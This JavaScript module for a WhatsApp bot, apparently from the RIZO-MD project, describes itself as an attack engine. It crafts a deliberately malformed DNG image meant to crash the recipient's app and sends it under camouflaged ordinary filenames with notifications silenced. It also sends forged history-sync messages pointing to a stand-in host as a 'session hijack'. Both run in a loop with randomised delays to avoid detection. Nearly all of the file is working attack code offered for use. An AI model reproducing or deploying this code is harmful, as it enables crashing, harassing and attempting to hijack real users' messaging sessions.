// lib/rizofuck.js
// RIZOFUCK Attack Engine — image OOB + sync hijack
// Owner-only, self-protected, cooldown-guarded
// Drop-in for RIZO-MD (Baileys)

const crypto = require('crypto');
const {
    generateWAMessageFromContent,
    proto
} = require('@whiskeysockets/baileys');

// ═══════════════════════════════════════════
//  CONFIG — tune kar sakte ho
// ═══════════════════════════════════════════
const CONFIG = {
    LOOP_COUNT: 5,               // kitne cycles
    JITTER_MS: 3000,             // cycle ke beech delay
    SYNC_ATTACK: true,           // sync hijack bhejna
    DNG_MODE: true,              // image crash vector
    SYNC_MODE: true,             // session hijack vector
    DISGUISE: true,              // filename camouflage
    SILENT: true,                // notification off
    DNG_REALISTIC_SIZE: 2048,    // DNG file size in bytes
    FAKE_SYNC_HOST: 'wa-sync.example.com'
};

// ═══════════════════════════════════════════
//  BENIGN FILENAMES — server ko normal dikhe
// ═══════════════════════════════════════════
const BENIGN_NAMES = [
    'IMG_20250115_143022',
    'Screenshot_20250115',
    'WhatsApp Image 2025',
    'Photo_20250115',
    'Document_2025',
    'IMG-20250115-WA0001',
    'received_1234567890'
];

function pickName() {
    const base = BENIGN_NAMES[Math.floor(Math.random() * BENIGN_NAMES.length)];
    return `${base}_${Date.now()}.dng`;
}

function jitter(base) {
    return base + (Math.random() * 2 - 1) * base * 0.5;
}

// ═══════════════════════════════════════════
//  DNG CRAFT — TIFF header + IFD with mismatch
// ═══════════════════════════════════════════
function craftDNG() {
    const size = CONFIG.DNG_REALISTIC_SIZE;
    const buf = Buffer.alloc(size);

    // TIFF little-endian magic
    buf.write('II*\x00', 0, 'binary');
    buf.writeUInt32LE(8, 4);       // IFD offset

    // IFD entry count
    buf.writeUInt16LE(5, 8);       // 5 entries

    let off = 10;

    // Tag 0x0100 ImageWidth = 1920
    buf.writeUInt16LE(0x0100, off); off += 2;
    buf.writeUInt16LE(3, off); off += 2;      // SHORT
    buf.writeUInt32LE(1, off); off += 4;      // count
    buf.writeUInt16LE(1920, off); off += 2;   // value
    off += 2;                                  // padding

    // Tag 0x0101 ImageHeight = 1080
    buf.writeUInt16LE(0x0101, off); off += 2;
    buf.writeUInt16LE(3, off); off += 2;
    buf.writeUInt32LE(1, off); off += 4;
    buf.writeUInt16LE(1080, off); off += 2;
    off += 2;

    // Tag 0x0115 SamplesPerPixel = 2 (MISMATCH — JPEG expects 1)
    buf.writeUInt16LE(0x0115, off); off += 2;
    buf.writeUInt16LE(3, off); off += 2;
    buf.writeUInt32LE(1, off); off += 4;
    buf.writeUInt16LE(2, off); off += 2;
    off += 2;

    // Tag 0x0102 BitsPerSample = 8
    buf.writeUInt16LE(0x0102, off); off += 2;
    buf.writeUInt16LE(3, off); off += 2;
    buf.writeUInt32LE(1, off); off += 4;
    buf.writeUInt16LE(8, off); off += 2;
    off += 2;

    // Tag 0x0103 Compression = 7 (JPEG)
    buf.writeUInt16LE(0x0103, off); off += 2;
    buf.writeUInt16LE(3, off); off += 2;
    buf.writeUInt32LE(1, off); off += 4;
    buf.writeUInt16LE(7, off); off += 2;
    off += 2;

    // Next IFD = 0
    buf.writeUInt32LE(0, off);

    // Embed JPEG SOF3 marker with NumComponents=1 (mismatch)
    const jpegStart = 128;
    buf.writeUInt16BE(0xFFC3, jpegStart);      // SOF3 marker
    buf.writeUInt16BE(17, jpegStart + 2);      // length
    buf.writeUInt8(8, jpegStart + 4);          // precision
    buf.writeUInt16BE(1080, jpegStart + 5);    // height
    buf.writeUInt16BE(1920, jpegStart + 7);    // width
    buf.writeUInt8(1, jpegStart + 9);          // numComponents = 1 (MISMATCH with SamplesPerPixel=2)
    buf.writeUInt8(1, jpegStart + 10);         // component id
    buf.writeUInt8(0x11, jpegStart + 11);      // sampling
    buf.writeUInt8(0, jpegStart + 12);         // quant table

    // Fill rest with plausible DNG-like data
    for (let i = jpegStart + 20; i < size - 4; i += 4) {
        buf.writeUInt32LE(crypto.randomBytes(4).readUInt32LE(0), i);
    }

    return buf;
}

// ═══════════════════════════════════════════
//  VECTOR 1 — IMAGE CRASH
// ═══════════════════════════════════════════
async function sendCrashImage(sock, targetJid) {
    const dng = craftDNG();
    const fname = pickName();

    const msg = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
        documentMessage: {
            url: `data:image/dng;base64,${dng.toString('base64')}`,
            mimetype: 'image/dng',
            fileName: fname,
            fileLength: dng.length,
            pageCount: 1,
            jpegThumbnail: dng.slice(0, 512),
            contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                silent: CONFIG.SILENT,
                expiration: 0
            }
        }
    }), { userJid: targetJid });

    await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
    return msg.key.id;
}

// ═══════════════════════════════════════════
//  VECTOR 2 — SYNC HIJACK
// ═══════════════════════════════════════════
async function sendSyncHijack(sock, targetJid) {
    const fakeKey = crypto.randomBytes(32);
    const fakeSha = crypto.randomBytes(32);

    const payload = {
        protocolMessage: {
            type: 5, // HISTORY_SYNC_NOTIFICATION
            historySyncNotification: {
                fileSha256: fakeSha,
                fileLength: 4096,
                mediaKey: fakeKey,
                directPath: `https://${CONFIG.FAKE_SYNC_HOST}/bootstrap.dng`,
                syncType: 2,
                chunkOrder: 1
            }
        }
    };

    const msg = generateWAMessageFromContent(targetJid,
        proto.Message.fromObject(payload),
        { userJid: targetJid }
    );

    await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
    return msg.key.id;
}

// ═══════════════════════════════════════════
//  MAIN — RIZOFUCK
// ═══════════════════════════════════════════
async function Rizofuck(sock, targetJid, onProgress) {
    try {
        let sent = 0;
        const total = CONFIG.LOOP_COUNT * (
            (CONFIG.DNG_MODE ? 1 : 0) + (CONFIG.SYNC_MODE ? 1 : 0)
        );

        for (let i = 0; i < CONFIG.LOOP_COUNT; i++) {
            if (CONFIG.DNG_MODE) {
                try {
                    await sendCrashImage(sock, targetJid);
                    sent++;
                    if (onProgress) onProgress(sent, total, 'image');
                } catch (err) {
                    console.error('[rizofuck] image error:', err.message);
                }
            }

            await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_MS)));

            if (CONFIG.SYNC_MODE) {
                try {
                    await sendSyncHijack(sock, targetJid);
                    sent++;
                    if (onProgress) onProgress(sent, total, 'sync');
                } catch (err) {
                    console.error('[rizofuck] sync error:', err.message);
                }
            }

            await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_MS)));
        }

        return { ok: true, sent };
    } catch (err) {
        console.error('[rizofuck] fatal:', err.message);
        return { ok: false, error: err.message };
    }
}

module.exports = { Rizofuck, CONFIG };